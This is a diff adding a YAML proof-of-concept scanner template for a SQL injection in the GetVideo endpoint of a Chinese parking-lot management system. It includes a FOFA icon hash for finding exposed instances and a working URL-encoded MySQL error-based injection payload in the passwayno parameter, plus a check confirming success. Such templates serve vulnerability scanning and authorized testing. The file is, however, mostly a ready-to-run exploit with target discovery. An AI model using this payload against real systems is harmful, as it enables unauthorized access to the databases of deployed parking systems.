@@ -1,0 +1,17 @@
+id: poc-yaml-cxyun-getvideo-sqli
+info:
+  name: 停车场后台管理系统 GetVideo SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 停车场后台管理系统
+  fofa: icon_hash="938984120"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /LaneMonitor/GetVideo?passwayno=1%27+AND+GTID_SUBSET%28CONCAT%28md5({{.t1}})%2C%28SELECT+%28ELT%283079%3D3079%2C0x3a%29%29%29%2C0x3a%29%2C3079%29+AND+%27OVwj%27%3D%27OVwj
+  expression: "status_code == 200 && \ncontains(body,\"set specification\") &&\ncontains(body,\"\
+    \\\"success\\\":false\") &&\ncontains(body,t2) &&\n!contains(body,\"<\")\n"
+transport: http
